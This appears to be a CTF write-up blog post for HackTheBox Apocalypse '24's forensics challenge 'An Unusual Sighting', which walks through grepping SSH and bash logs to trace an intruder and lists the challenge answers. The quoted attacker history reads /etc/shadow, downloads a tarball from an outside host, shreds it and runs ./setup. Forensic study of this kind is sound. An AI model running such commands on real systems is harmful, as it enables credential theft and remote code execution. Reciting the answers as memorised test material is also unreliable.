---
layout: post
title: "forensics anunusualsighting"
date: 2024-03-14 17:18:49 -0700
categories: ctfs
parent: HackTheBox - Apocalypse '24
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
  - pwn
  - ctf
---

## Forensics - An Unusual Sighting

During the capture the flag event, the primary focus was on analyzing two log files: `bash_history` and `sshd` files. The objective was to extract crucial information regarding a remote attacker's actions, specifically those related to logging into a server and executing commands.

To get the prompts and answer the questions, simply `nc <htbip> <htbport>`

### 1. Identifying SSH Server IP Address and Port
The initial task involved determining the IP address and port of the SSH server, which could be derived from the SSH logs. By parsing the SSH logs for data referencing "on" and "port", we successfully obtained the required information.

```sh
$cat sshd.log | grep -e "on.*port"
[2024-01-19 12:59:11] Server listening on 0.0.0.0 port 2221.
[2024-01-19 12:59:11] Server listening on :: port 2221.
[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain ""
```

### 2. Timestamp of First Successful Login
To ascertain the time of the first successful login, we scanned the SSH logs for the "Accepted password" field, which provided us with the timestamp of the initial successful login.

```sh
$cat sshd.log | grep -e "Accepted password"
[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2 #<-- First accepted login
[2024-02-15 10:40:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
[2024-02-15 18:51:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
[2024-02-16 10:26:50] Accepted password for softdev from 100.86.71.224 port 58713 ssh2
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
[2024-02-20 11:10:14] Accepted password for softdev from 100.87.190.253 port 63371 ssh2
[2024-02-21 10:49:50] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
[2024-02-21 18:17:50] Accepted password for softdev from 100.7.98.129 port 47765 ssh2
[2024-02-22 12:07:14] Accepted password for softdev from 100.11.239.78 port 49811 ssh2
[2024-02-23 10:49:50] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
```

### 3. Detecting Unusual Logins
An important aspect was identifying unusual logins. This required inferring information from the SSH logs, particularly by examining unfamiliar IP addresses. By scrutinizing the SSH logs for such IP addresses, we could pinpoint the time of the unusual login.

```sh
[2024-02-16 10:26:50] Accepted password for softdev from 100.86.71.224 port 58713 ssh2
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2 #<-- This is an odd IP in a sea of 100.87 IPs
[2024-02-20 11:10:14] Accepted password for softdev from 100.87.190.253 port 63371 ssh2
```

### 4. Extracting Attempted SSH Key Fingerprint
In our analysis, we also retrieved the attempted fingerprint from the SSH keys that were not accepted by the remote attacker, providing valuable insight into their attempted access methods.

```sh
$cat sshd.log | grep -e "2.67.182.119"
[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain ""
[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4 #<-- This is the odd fingerprint
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
[2024-02-19 04:00:14] Starting session: shell on pts/2 for root from 2.67.182.119 port 60071 id 0
[2024-02-19 04:38:17] Received disconnect from 2.67.182.119 port 60071:11: disconnected by user
[2024-02-19 04:38:17] Disconnected from user root 2.67.182.119 port 60071
```

### 5. Analyzing Command Execution
The final steps involved analyzing the timeframe during which the attacker logged in, specifically focusing on odd hours to discern the commands executed. This approach enabled us to determine the commands executed by the attacker during the identified timeframe.

```sh
$cat bash_history.txt | grep "04:"
[2024-02-19 04:00:18] whoami #< This is the first command
[2024-02-19 04:00:20] uname -a
[2024-02-19 04:00:40] cat /etc/passwd
[2024-02-19 04:01:01] cat /etc/shadow
[2024-02-19 04:01:15] ps faux
[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
[2024-02-19 04:10:02] tar xvf latest.tar.gz
[2024-02-19 04:12:02] shred -zu latest.tar.gz
[2024-02-19 04:14:02] ./setup #<-- This is the last command
```

### Putting it all together

```sh
[08:15:34] tokugero :: pangolin  ➜  apocalypse2024/forensics/anunusualsighting » nc 83.136.253.251 43398

+---------------------+---------------------------------------------------------------------------------------------------------------------+
|        Title        |                                                     Description                                                     |
+---------------------+---------------------------------------------------------------------------------------------------------------------+
| An unusual sighting |                        As the preparations come to an end, and The Fray draws near each day,                        |
|                     |             our newly established team has started work on refactoring the new CMS application for the competition. |
|                     |                  However, after some time we noticed that a lot of our work mysteriously has been disappearing!     |
|                     |                     We managed to extract the SSH Logs and the Bash History from our dev server in question.        |
|                     |               The faction that manages to uncover the perpetrator will have a massive bonus come the competition!   |
|                     |                                                                                                                     |
|                     |                                            Note: Operating Hours of Korp: 0900 - 1900                               |
+---------------------+---------------------------------------------------------------------------------------------------------------------+


Note 2: All timestamps are in the format they appear in the logs

What is the IP Address and Port of the SSH Server (IP:PORT)
> 100.107.36.130:2221
[+] Correct!

What time is the first successful Login
> 2024-02-13 11:29:50
[+] Correct!

What is the time of the unusual Login
> 2024-02-19 04:00:14
[+] Correct!

What is the Fingerprint of the attacker's public key
> OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
[+] Correct!

What is the first command the attacker executed after logging in
> whoami
[+] Correct!

What is the final command the attacker executed before logging out
> ./setup
[+] Correct!

[+] Here is the flag: HTB{B3sT_<redacted>}
```
